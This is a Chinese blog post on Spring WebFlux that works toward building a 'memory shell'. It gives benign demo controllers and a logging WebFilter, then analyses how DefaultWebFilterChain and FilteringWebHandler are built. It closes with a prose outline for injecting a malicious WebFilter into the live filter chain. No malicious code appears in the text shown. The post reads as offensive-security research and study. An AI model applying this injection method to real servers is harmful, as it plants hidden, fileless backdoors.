<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言最近开发的项目需要用上，学习一下 WebFlux 是 Spring Framework 5 引入的响应式 Web 框架，旨在构建非阻塞、异步、高并发的 Web 应用程序。它基于 Reactive Streams 规范，通过 Reactor 库实现响应式编程模型。传统 Spring MVC 基于 Servlet 的同步阻塞模型，每个请求占用一个线程；而 WebFlux 采用事件驱动模型，通过少量">
<meta property="og:type" content="article">
<meta property="og:title" content="Java内存马篇——WebFLux型">
<meta property="og:url" content="http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/index.html">
<meta property="og:site_name" content="cmisl_破站">
<meta property="og:description" content="前言最近开发的项目需要用上，学习一下 WebFlux 是 Spring Framework 5 引入的响应式 Web 框架，旨在构建非阻塞、异步、高并发的 Web 应用程序。它基于 Reactive Streams 规范，通过 Reactor 库实现响应式编程模型。传统 Spring MVC 基于 Servlet 的同步阻塞模型，每个请求占用一个线程；而 WebFlux 采用事件驱动模型，通过少量">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610141406382.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610141438314.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610143416044.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610143430873.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610152404023.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610152353624.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610164111606.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610171251122.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610171432557.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610172109426.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610172914920.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610174318864.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250611095826451.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250611101352481.png">
<meta property="article:published_time" content="2025-06-09T16:00:00.000Z">
<meta property="article:modified_time" content="2025-07-04T18:14:07.690Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610141406382.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Java内存马篇——WebFLux型</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2025/07/14/OpenRasp%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&text=Java内存马篇——WebFLux型"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&title=Java内存马篇——WebFLux型"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&is_video=false&description=Java内存马篇——WebFLux型"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java内存马篇——WebFLux型&body=Check out this article: http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&title=Java内存马篇——WebFLux型"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&title=Java内存马篇——WebFLux型"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&title=Java内存马篇——WebFLux型"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&title=Java内存马篇——WebFLux型"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&name=Java内存马篇——WebFLux型&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&t=Java内存马篇——WebFLux型"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WebFluxDemo"><span class="toc-number">2.</span> <span class="toc-text">WebFluxDemo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%91%E5%B8%83%E2%80%94%E2%80%94%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">发布——订阅模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mono%E5%92%8CFlux"><span class="toc-number">3.2.</span> <span class="toc-text">Mono和Flux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mono%EF%BC%9A%E5%8D%95%E4%B8%80%E7%BB%93%E6%9E%9C%E6%88%96%E7%A9%BA%E5%80%BC%E7%9A%84%E5%BC%82%E6%AD%A5%E5%AE%B9%E5%99%A8%E2%80%8B"><span class="toc-number">3.2.1.</span> <span class="toc-text">Mono：单一结果或空值的异步容器​</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flux%EF%BC%9A%E5%A4%9A%E5%85%83%E7%B4%A0%E6%B5%81%E5%BC%8F%E5%A4%84%E7%90%86%E7%9A%84%E9%80%9A%E7%94%A8%E5%AE%B9%E5%99%A8%E2%80%8B"><span class="toc-number">3.2.2.</span> <span class="toc-text">Flux：多元素流式处理的通用容器​</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WebFlux%E4%B8%AD%E7%9A%84Filter"><span class="toc-number">4.</span> <span class="toc-text">WebFlux中的Filter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebFilter"><span class="toc-number">4.1.</span> <span class="toc-text">WebFilter</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">参考文章</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Java内存马篇——WebFLux型
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">cmisl</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-06-09T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-06-10</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近开发的项目需要用上，学习一下</p>
<p>WebFlux 是 Spring Framework 5 引入的响应式 Web 框架，旨在构建非阻塞、异步、高并发的 Web 应用程序。它基于 Reactive Streams 规范，通过 Reactor 库实现响应式编程模型。传统 Spring MVC 基于 Servlet 的同步阻塞模型，每个请求占用一个线程；而 WebFlux 采用事件驱动模型，通过少量线程处理大量请求，减少线程阻塞和资源浪费</p>
<h1 id="WebFluxDemo"><a href="#WebFluxDemo" class="headerlink" title="WebFluxDemo"></a>WebFluxDemo</h1><p>先来写个demo了解一些WebFlux的基本构成。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610141406382.png"></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610141438314.png"></p>
<p>其实和SpringMVC比较类似，下面是一个小Demo</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl.webfluxmemoryshell.controller;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> cmisl.webfluxmemoryshell.model.Message;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;  </span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Flux;  </span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@RestController</span>  </span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/messages&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MessageController</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 返回单个元素的异步响应  </span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span>  </span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Message&gt; <span class="title function_">getMessageById</span><span class="params">(<span class="meta">@PathVariable</span> String id)</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> Mono.just(<span class="keyword">new</span> <span class="title class_">Message</span>(id, <span class="string">&quot;Hello from WebFlux!&quot;</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 返回流式数据  </span></span><br><span class="line">    <span class="meta">@GetMapping</span>  </span><br><span class="line">    <span class="keyword">public</span> Flux&lt;Message&gt; <span class="title function_">getAllMessages</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> Flux.just(  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;First message&quot;</span>),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;Second message&quot;</span>),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;Third message&quot;</span>)  </span><br><span class="line">        );  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 处理POST请求  </span></span><br><span class="line">    <span class="meta">@PostMapping</span>  </span><br><span class="line">    <span class="keyword">public</span> Mono&lt;String&gt; <span class="title function_">createMessage</span><span class="params">(<span class="meta">@RequestBody</span> Message message)</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> Mono.just(<span class="string">&quot;Message created: &quot;</span> + message.getContent());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl.webfluxmemoryshell.model;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Message</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String id;  </span><br><span class="line">    <span class="keyword">private</span> String content;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Message</span><span class="params">()</span> &#123;&#125; <span class="comment">// 无参构造  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Message</span><span class="params">(String id, String content)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.id = id;  </span><br><span class="line">        <span class="built_in">this</span>.content = content;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getContent</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> content;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setContent</span><span class="params">(String content)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.content = content;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getId</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> id;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(String id)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.id = id;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610143416044.png"></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610143430873.png"></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="发布——订阅模式"><a href="#发布——订阅模式" class="headerlink" title="发布——订阅模式"></a>发布——订阅模式</h2><p>一种软件架构设计模式，用于解耦生产者(发布者)和消费者(订阅者)之间的关系，使得系统可以灵活应对高并发、异步处理和动态扩展。</p>
<p>下面是该模型下的一些基本概念。</p>
<ul>
<li><strong>发布者（Publisher）​</strong>​：生成消息但不指定接收者，仅将消息发布到特定主题（Topic）。例如，电商系统中订单创建后发布“订单已支付”事件。</li>
<li><strong>订阅者（Subscriber）​</strong>​：通过订阅感兴趣的主题接收消息。例如，库存服务订阅“订单已支付”事件以扣减库存。</li>
<li><strong>消息代理（Message Broker）​</strong>​：作为中间枢纽，负责接收、存储和路由消息。例如 RabbitMQ 的 Exchange 和 Kafka 的 Topic 机制</li>
</ul>
<p>交互流程也比较简单，发布者将消息发送到消息代理中，代理根据主题或者内容的过滤规则将消息路由到匹配的订阅者。订阅者则通过异步的方式接收消息，无需与发布者直接交互。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[发布者] → [消息代理] → [订阅者]</span><br><span class="line">    │           │</span><br><span class="line">    └── 发布消息  └── 订阅兴趣</span><br></pre></td></tr></table></figure>

<h2 id="Mono和Flux"><a href="#Mono和Flux" class="headerlink" title="Mono和Flux"></a>Mono和Flux</h2><p>从上面的一个Demo中，会发现控制器的返回类型是<code>Mono&lt;T&gt;</code>或<code>Flux&lt;T&gt;</code>。</p>
<p>WebFlux主要基于响应式编程框架 Reactor的，而Mono 和 Flux 正是 ​Reactor​ 中的核心类型，分别代表 ​<strong>0&#x2F;1 个元素</strong>和 ​<strong>0&#x2F;N 个元素</strong>的异步数据流。两者均是Publisher的实现。</p>
<h3 id="Mono：单一结果或空值的异步容器​"><a href="#Mono：单一结果或空值的异步容器​" class="headerlink" title="Mono：单一结果或空值的异步容器​"></a><strong>Mono：单一结果或空值的异步容器</strong>​</h3><p><strong>定义与特性</strong>​<br>Mono 表示一个可能包含 ​<strong>0 或 1 个元素</strong>​ 的异步序列，或仅发出完成&#x2F;错误信号。其底层实现基于 Reactive Streams 规范的 <code>Publisher</code> 接口，但通过语义约束明确单值特性。例如，数据库查询单条记录、HTTP 请求响应等场景天然适配 Mono。<br>​<strong>核心逻辑</strong>​：Mono 的生命周期仅有一次数据发射机会，无论成功（一个元素）、空（无元素）或失败（错误）。这种设计使其在需要明确结果边界的场景中高效且直观。</p>
<p><strong>应用场景</strong>​</p>
<ul>
<li><strong>单次 I&#x2F;O 操作</strong>​：如 <code>WebClient</code> 发起的 HTTP GET 请求，返回单个 JSON 对象。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mono&lt;User&gt; user = webClient.get()</span><br><span class="line">	.uri(<span class="string">&quot;/users/1&quot;</span>)</span><br><span class="line">	.retrieve()</span><br><span class="line">	.bodyToMono(User.class);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>数据库查询</strong>​：通过 Spring Data R2DBC 执行 <code>SELECT</code> 语句获取单条记录。</li>
</ul>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610152404023.png"></p>
<h3 id="Flux：多元素流式处理的通用容器​"><a href="#Flux：多元素流式处理的通用容器​" class="headerlink" title="Flux：多元素流式处理的通用容器​"></a><strong>Flux：多元素流式处理的通用容器</strong>​</h3><p><strong>定义与特性</strong>​<br>Flux 表示一个可能包含 ​<strong>0 到 N 个元素</strong>​ 的异步序列，支持无限流。其设计目标是处理批量数据、实时事件流或持续数据管道。例如，分页查询结果、Kafka 消息流或传感器实时数据均适合用 Flux 表达。<br>​<strong>核心逻辑</strong>​：Flux 允许动态发射多个元素，并通过背压机制协调生产与消费速率。其生命周期包含多次数据发射、中间转换及最终完成或错误信号。</p>
<p><strong>应用场景</strong>​</p>
<ul>
<li><strong>批量数据处理</strong>​：如从数据库批量读取记录并逐条转换。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flux&lt;User&gt; users = Flux.range(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">	.flatMap(id -&gt; userRepository.findById(id));</span><br></pre></td></tr></table></figure>

<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610152353624.png"></p>
<h1 id="WebFlux中的Filter"><a href="#WebFlux中的Filter" class="headerlink" title="WebFlux中的Filter"></a>WebFlux中的Filter</h1><p>Spring WebFlux 没有监听器Listener和拦截器interceptor，但是任然存在Filter用于拦截请求并做处理。WebFlux的Filter 可分为 <code>WebFilter</code> 和 <code>HandlerFilterFunction</code> 两类。</p>
<h2 id="WebFilter"><a href="#WebFilter" class="headerlink" title="WebFilter"></a>WebFilter</h2><p>下面是一个Spring WebFlux WebFilter的demo。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl.webfluxmemoryshell.filter;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.core.annotation.Order;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;  </span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;  </span><br><span class="line"><span class="keyword">import</span> java.time.Duration;  </span><br><span class="line"><span class="keyword">import</span> java.time.Instant;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="meta">@Order(1)</span> <span class="comment">// 过滤器执行顺序（数值越小优先级越高）  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestLogFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, WebFilterChain chain)</span> &#123;  </span><br><span class="line">        <span class="type">Instant</span> <span class="variable">startTime</span> <span class="operator">=</span> Instant.now();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequest().getPath().value();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange)  </span><br><span class="line">                .doOnSuccess(aVoid -&gt; &#123;  </span><br><span class="line">                    <span class="type">Duration</span> <span class="variable">duration</span> <span class="operator">=</span> Duration.between(startTime, Instant.now());  </span><br><span class="line">                    System.out.println(<span class="string">&quot;Request processed: &quot;</span> + path + <span class="string">&quot; | Time taken: &quot;</span> + duration.toMillis() + <span class="string">&quot;ms&quot;</span>);  </span><br><span class="line">                &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动后访问控制器中的接口。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610164111606.png"></p>
<p>在过滤器中打上断点然后再次访问，可以看到过滤器存在在一个DefaultWebFilterChain中。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610171251122.png"></p>
<p>有点类似tomcat的filter的责任链机制，调用chain的filter方法，然后会走到invokeFilter中去调用链中过滤器的filter方法，过滤器的filter正在return的时候会再次走到chain的filter方法，然后依次调用过滤器的filter方法。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610171432557.png"></p>
<p>DefaultWebFilterChain类存在三个构造方法，其中一个被@Deprecated注解标记表示已弃用，那不管他，剩下两个打上断点，重新调试启动项目。</p>
<p>这里是进入到公有的构造函数，实际上这里构造完之后的是一个递归链的结构，每个DefaultWebFilterChain实例持有当前过滤器（currentFilter）和剩余链（chain），形成递归式的链式调用关系。</p>
<p>不过从上层角度看，只需要调用公有构造函数，传入过滤器的数组就可以生成过滤器链。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610172109426.png"></p>
<p>往上追溯哪里生成过滤器链的话，就会到FilteringWebHandler这个类中，直接调用公有构造函数生成过滤器链，然后将链赋值给chain属性。因此暂且有了一个构造内存马的大致思路，制作一个恶意WebFilter，然后在调用DefaultWebFilterChain公有构造函数的时候，将恶意WebFilter作为参数一部分传入，随后将这个过滤器链赋值给FilteringWebHandler实例的chain属性中。</p>
<p>至于新增过滤器的思路，上诉也提到过这是一个递归链结构。每个DefaultWebFilterChain实例持有当前过滤器（currentFilter）和剩余链（chain）。想要新增一个过滤器进去可不只是修改一个allFilters变量这么简单。如果新增的话可以考虑新增一个DefaultWebFilterChain实例到递归连中一个节点的chain属性上。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610172914920.png"></p>
<p>调用公有构造函数构造DefaultWebFilterChain的参数，一个是handler，一个是filters，也就是所有过滤器的一个列表。获取起来并不困难，都是chain中可以找到的。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250610174318864.png"></p>
